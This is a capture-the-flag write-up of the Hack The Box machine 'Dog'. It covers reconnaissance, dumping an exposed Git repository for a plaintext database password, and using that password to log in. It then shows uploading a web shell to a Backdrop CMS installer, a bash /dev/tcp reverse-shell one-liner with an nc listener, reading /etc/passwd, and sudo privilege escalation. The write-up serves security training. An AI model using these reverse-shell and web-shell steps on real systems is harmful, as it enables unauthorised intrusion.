# Dog Writeup - by Thammanant Thamtaranon
  - Dog is an easy Linux machine on Hack The Box.

## Reconnaissance
  - First, we run the command `nmap -A -T4 -p- -Pn 10.10.11.58` to identify open TCP ports and their service information.  
![Nmap_Scan](Nmap_Scan.png)
  - From the scan, we gather several details:
  - We discover that we can access `robots.txt`, which contains a list of entries.
  - The target is running CMS Backdrop version 1.
  - The web server is Apache httpd 2.4.41.
  - There is a `.git` directory present.

## Scanning & Enumeration
  - With port 80 open, we use the command `dirsearch -u 10.10.11.58` to enumerate directories.  
![Dirsearch_Scan](Dirsearch_Scan.png)
  - After enumerating, we find the user `tiffany@dog.htb` in the file located at `http://10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json`.
  - I attempted common passwords, but unfortunately, they were unsuccessful.
  - We use GitTools to dump all Git objects using the command `./gitdumper.sh http://10.10.11.58/.git/ .`.
  - Then we run `git checkout .` and search for credentials.
  - Reading the file `settings.php`, we find the database password:  
    `$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`
  - Using the username `tiffany@dog.htb` and the database password `BackDropJ2024DS2024`, we got in.

## Exploitation
  - After gaining access as Tiffany, we search for Backdrop exploits using `searchsploit`.  
![Searchsploit](Searchsploit.png)
  - We navigate to `http://10.10.11.58/?q=admin/installer/manual` to manually install our web shell.
  - Since the `.zip` extension is blocked, we compress our shell folder into a `.tar.gz` archive with the command `tar -cvf shell.tar.gz shell`.
  - We then visit `http://10.10.11.58/modules/shell/shell.php` and test commands such as `id`.  
![Shell](Shell.png)
  - With the shell working, we establish a reverse shell using:  
    `bash -c 'bash -i >& /dev/tcp/10.10.16.11/4444 0>&1'`  
  - On our machine, we listen with:  
    `nc -lvnp 4444`
  - We have to be quick since it seems some script is deleting our shell.
  - Next, we run `cat /etc/passwd` to enumerate users.  
![Users](Users.png)
  - We confirm there are two users: `jobert` and `johncusack`.
  - After searching for useful information without success, I tried SSH with both users using previously found passwords and successfully logged in as `johncusack`.
  - We retrieve the user flag.
  - Running `sudo -l` shows us the commands we can run with elevated privileges.  
![SUDO](SUDO.png)
  - We notice that `/usr/local/bin/bee` can be run with sudo, so we explore it for privilege escalation.
  - Running `/usr/local/bin/bee` reveals the option to use `eval`, but returns the error:  
    "The required bootstrap level for 'eval' is not ready."
  - After researching, I learned that the root directory must be specified because Bee requires bootstrapping the Backdrop CMS.  
![Root](Root.png)
  - Finally, we obtain the root flag.
